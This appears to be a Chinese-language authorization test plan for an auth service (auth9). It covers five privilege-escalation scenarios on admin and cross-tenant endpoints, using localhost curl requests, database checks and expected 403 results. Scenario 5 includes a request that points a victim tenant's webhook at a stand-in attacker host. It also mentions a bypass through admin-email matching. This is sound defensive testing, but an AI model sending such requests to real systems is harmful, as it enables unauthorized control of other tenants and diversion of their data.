# 业务逻辑安全 - 管理运营端点越权滥用测试

**模块**: 业务逻辑安全
**测试范围**: 认证通过但授权缺失导致的管理员运营端点越权
**场景数**: 5
**风险等级**: 🔴 极高
**ASVS 5.0 矩阵ID**: M-BIZ-03
**OWASP ASVS 5.0**: V8.2,V4.2,V16.2
**回归任务映射**: Backlog #2, #12, #20


---

## 去重说明

本文件聚焦“管理员运营端点”越权，区别于现有文档：
- `authorization/05-system-config-authz.md` 侧重 `/api/v1/system/*` 与策略配置接口。
- 本文件覆盖 `/api/v1/admin/users/*`、`/api/v1/audit-logs`、`/api/v1/security/alerts`、`/api/v1/tenants/{tenant_id}/services`、`/api/v1/tenants/{tenant_id}/webhooks/*`。

---

## 场景 1：普通用户越权强制登出其他用户

### 前置条件
- 普通用户 token：`NORMAL_TOKEN`
- 受害者用户 id：`VICTIM_USER_ID`

### 攻击目标
验证非管理员是否可调用 `POST /api/v1/admin/users/{id}/logout`。

### 攻击步骤
1. 使用普通用户 token 发起请求。
2. 观察响应状态码。
3. 校验受害者会话是否被撤销。

### 预期安全行为
- 返回 `403 Forbidden`
- 不发生任何会话撤销

### 验证方法
```bash
curl -i -X POST "http://localhost:8080/api/v1/admin/users/$VICTIM_USER_ID/logout" \
  -H "Authorization: Bearer $NORMAL_TOKEN"

mysql -h 127.0.0.1 -P 4000 -u root -D auth9 -e "
SELECT COUNT(*) AS active_sessions
FROM sessions
WHERE user_id='$VICTIM_USER_ID' AND revoked_at IS NULL;
"
```

### 修复建议
- 在 handler 或统一 policy layer 中强制 platform admin 权限校验。

---

## 场景 2：普通用户越权读取审计日志

### 前置条件
- 普通用户 token：`NORMAL_TOKEN`

### 攻击目标
验证非管理员是否可读取审计日志接口 `GET /api/v1/audit-logs`。

### 攻击步骤
1. 直接调用审计日志列表接口。
2. 检查返回内容是否含敏感字段（操作者、资源、时间线）。

### 预期安全行为
- 返回 `403 Forbidden`
- 不返回审计明细

### 验证方法
```bash
curl -i "http://localhost:8080/api/v1/audit-logs?limit=20" \
  -H "Authorization: Bearer $NORMAL_TOKEN"
```

### 修复建议
- 审计日志访问至少要求管理员角色，且应做租户范围过滤。

---

## 场景 3：普通用户越权读取/处置安全告警

### 前置条件
- **普通用户 token `NORMAL_TOKEN`**：必须使用 **非平台管理员邮箱** 生成（如 `member@test.com`），不能使用 `admin@auth9.local` 或其他在 `PLATFORM_ADMIN_EMAILS` 中的邮箱
- 存在待处理告警 id：`ALERT_ID`

> **⚠️ 常见误报原因**: 如果使用 `admin@auth9.local` 等平台管理员邮箱生成 token，即使角色设为 member，policy 层仍会通过邮箱匹配放行（`is_platform_admin_email` 检查优先于角色检查）。

### 攻击目标
验证普通用户是否可访问 `GET /api/v1/security/alerts` 和 `POST /api/v1/security/alerts/{id}/resolve`。

### 攻击步骤
1. 请求告警列表。
2. 尝试标记某条告警为已处理。

### 预期安全行为
- 列表接口返回 `403`
- 处置接口返回 `403`

### 验证方法
```bash
# 1. 生成普通用户 token (确保使用非管理员邮箱)
NORMAL_TOKEN=$(node .claude/skills/tools/gen-test-tokens.js tenant-access \
  --tenant-id "$TENANT_ID" --role member --email member@test.com 2>/dev/null | grep token | awk '{print $2}')

# 2. 请求告警列表
curl -i "http://localhost:8080/api/v1/security/alerts?page=1&per_page=20" \
  -H "Authorization: Bearer $NORMAL_TOKEN"
# 预期: 403 Forbidden

# 3. 尝试处置告警
curl -i -X POST "http://localhost:8080/api/v1/security/alerts/$ALERT_ID/resolve" \
  -H "Authorization: Bearer $NORMAL_TOKEN"
# 预期: 403 Forbidden
```

### 安全防护层
本端点已实现以下防护：
1. **JWT middleware**: 路由在 `protected_routes` 中，要求有效的 Bearer token
2. **Policy layer**: `enforce(SecurityAlertRead/Resolve)` → `require_platform_admin()` 校验邮箱是否在 `PLATFORM_ADMIN_EMAILS` 列表中

### 常见测试失败排查

| 症状 | 原因 | 修复 |
|------|------|------|
| 普通用户返回 200 | Token 使用了平台管理员邮箱 | 确保 `--email` 参数使用非管理员邮箱 |
| 返回 401 | Token 过期或签名无效 | 重新生成 token |

---

## 场景 4：普通用户跨租户切换服务启停

### 前置条件
- **`NORMAL_TOKEN` 必须是 Tenant Access Token**，且所属租户 ≠ `OTHER_TENANT_ID`
- 非所属租户 id：`OTHER_TENANT_ID`
- 全局服务 id：`GLOBAL_SERVICE_ID`

> **Token 生成要点**: 使用 `.claude/skills/tools/gen-test-tokens.js` 生成 Tenant Access Token。
> 确保 token 的 `tenant_id` claim 与 `OTHER_TENANT_ID` **不同**，否则测试的不是跨租户场景。

### 攻击目标
验证普通用户是否可调用 `POST /api/v1/tenants/{tenant_id}/services` 修改他租户服务状态。

### 攻击步骤
1. 对他租户发起服务启用/禁用请求。
2. 查询 `tenant_services` 是否发生写入。

### 预期安全行为
- 返回 `403 Forbidden`（消息: "Cannot access another tenant"）
- `tenant_services` 不发生新增/更新

### 安全防护层
本端点已实现以下防护：
1. **Policy layer**: `enforce(TenantServiceWrite, Tenant(tenant_id))` → `require_tenant_admin_or_permission()` 校验 `token_tenant_id == tenant_id`
2. 跨租户请求在 policy 层即被拒绝，不会到达数据库操作

### 验证方法
```bash
# 1. 生成攻击者 token (tenant A 的普通成员)
ATTACKER_TENANT_ID="<攻击者所属的 tenant ID>"
NORMAL_TOKEN=$(node .claude/skills/tools/gen-test-tokens.js tenant-access \
  --tenant-id "$ATTACKER_TENANT_ID" --role member 2>/dev/null | grep token | awk '{print $2}')

# 2. 用攻击者 token 尝试修改 victim tenant 的服务
OTHER_TENANT_ID="<目标 tenant ID, 与 ATTACKER_TENANT_ID 不同>"
curl -i -X POST "http://localhost:8080/api/v1/tenants/$OTHER_TENANT_ID/services" \
  -H "Authorization: Bearer $NORMAL_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"service_id":"'$GLOBAL_SERVICE_ID'","enabled":false}'

# 预期: 403 "Cannot access another tenant"

# 3. 验证数据库未被修改
mysql -h 127.0.0.1 -P 4000 -u root -D auth9 -e "
SELECT tenant_id, service_id, enabled
FROM tenant_services
WHERE tenant_id='$OTHER_TENANT_ID' AND service_id='$GLOBAL_SERVICE_ID';
"
```

### 常见误报

| 现象 | 原因 | 解决 |
|------|------|------|
| 返回 200 而非 403 | Token 的 `tenant_id` 与 `OTHER_TENANT_ID` 相同（实际测试的是同租户操作） | 确保 token 属于不同租户 |
| 返回 200 且数据变更 | Token 持有者是目标租户的 admin 或拥有 `tenant_service:write` 权限 | 使用 member 角色且无特殊权限的 token |

---

## 场景 5：普通用户跨租户篡改 Webhook 配置

### 前置条件
- **`NORMAL_TOKEN` 必须是 Tenant Access Token**，且所属租户 ≠ `OTHER_TENANT_ID`
- 非所属租户 id：`OTHER_TENANT_ID`
- 该租户 webhook id：`WEBHOOK_ID`

> **Token 生成要点**: 同场景 4，确保 token 的 `tenant_id` claim 与 `OTHER_TENANT_ID` **不同**。

### 攻击目标
验证普通用户是否可操作 `PUT/DELETE /api/v1/tenants/{tenant_id}/webhooks/{id}` 和 `POST .../regenerate-secret`。

### 攻击步骤
1. 尝试更新 webhook URL。
2. 尝试删除 webhook。
3. 尝试重置 webhook secret。

### 预期安全行为
- 所有请求返回 `403`（消息: "Cannot access another tenant"）
- 配置不被篡改、secret 不被轮换

### 安全防护层
本端点已实现以下防护：
1. **Policy layer**: `enforce(WebhookWrite, Tenant(tenant_id))` → `require_tenant_admin_or_permission()` 校验 `token_tenant_id == tenant_id`
2. **Handler layer**: 额外检查 `existing.tenant_id != path_tenant_id` 防御同租户越权

### 验证方法
```bash
# 使用与场景 4 相同方式生成跨租户 token
curl -i -X PUT "http://localhost:8080/api/v1/tenants/$OTHER_TENANT_ID/webhooks/$WEBHOOK_ID" \
  -H "Authorization: Bearer $NORMAL_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"name":"hijacked","url":"https://attacker.example/webhook","events":["user.created"],"enabled":true}'

curl -i -X POST "http://localhost:8080/api/v1/tenants/$OTHER_TENANT_ID/webhooks/$WEBHOOK_ID/regenerate-secret" \
  -H "Authorization: Bearer $NORMAL_TOKEN"

curl -i -X DELETE "http://localhost:8080/api/v1/tenants/$OTHER_TENANT_ID/webhooks/$WEBHOOK_ID" \
  -H "Authorization: Bearer $NORMAL_TOKEN"

# 预期: 所有请求返回 403 "Cannot access another tenant"
```

### 常见误报

| 现象 | 原因 | 解决 |
|------|------|------|
| 返回 200 而非 403 | Token 的 `tenant_id` 与 `OTHER_TENANT_ID` 相同 | 确保 token 属于不同租户 |
| PUT 返回 403 但 DELETE 返回 200 | 不应发生；两者均有 policy + handler 双重检查 | 检查 token 是否过期后重新生成 |

---

## 检查清单

| # | 场景 | 状态 | 测试日期 | 测试人员 | 发现问题 |
|---|------|------|----------|----------|----------|
| 1 | 普通用户越权强制登出其他用户 | ☐ | | | |
| 2 | 普通用户越权读取审计日志 | ☐ | | | |
| 3 | 普通用户越权读取/处置安全告警 | ☐ | | | |
| 4 | 普通用户跨租户切换服务启停 | ☐ | | | |
| 5 | 普通用户跨租户篡改 Webhook 配置 | ☐ | | | |

---


---

## 标准化回归 Checklist（ASVS 5.0）

**矩阵ID**: M-BIZ-03  
**适用控制**: V8.2,V4.2,V16.2  
**关联任务**: Backlog #2, #12, #20  
**建议回归频率**: 每次发布前 + 缺陷修复后必跑  
**场景总数**: 5

### 执行清单
- [ ] M-BIZ-03-C01 | 控制: V8.2 | 任务: #2, #12, #20 | 动作: 执行文档内相关攻击步骤并记录证据
- [ ] M-BIZ-03-C02 | 控制: V4.2 | 任务: #2, #12, #20 | 动作: 执行文档内相关攻击步骤并记录证据
- [ ] M-BIZ-03-C03 | 控制: V16.2 | 任务: #2, #12, #20 | 动作: 执行文档内相关攻击步骤并记录证据

### 回归记录表
| 检查项ID | 执行结果(pass/fail) | 风险等级 | 证据（请求/响应/日志/截图） | 备注 |
|---|---|---|---|---|
|  |  |  |  |  |

### 退出准则
1. 所有检查项执行完成，且高风险项无 `fail`。
2. 如存在 `fail`，必须附带漏洞单号、修复计划和复测结论。
3. 回归报告需同时记录矩阵ID与 Backlog 任务号，便于跨版本追溯。
